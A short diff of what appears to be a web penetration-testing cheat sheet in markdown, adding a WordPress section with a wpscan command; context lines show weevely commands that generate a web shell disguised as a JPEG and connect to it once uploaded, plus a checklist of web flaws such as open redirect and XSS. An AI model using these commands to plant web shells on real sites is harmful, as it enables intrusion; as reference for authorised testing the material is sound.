@@ -87,6 +87,9 @@ echo "<pre>$output</pre>";
 - __```weevely generate password ~/Desktop/shell.jpg```__
 - __```weevely <url_where_the_file_uploaded>/shell.jpg/shell.php password```__
 
+## WordPress
+- __```wpscan --url <url>```__
+
 # Check list
 - [x] [Open redirect](open_redirect.md)
 - [x] [Cross-Site Scripting (XSS)](xss.md)
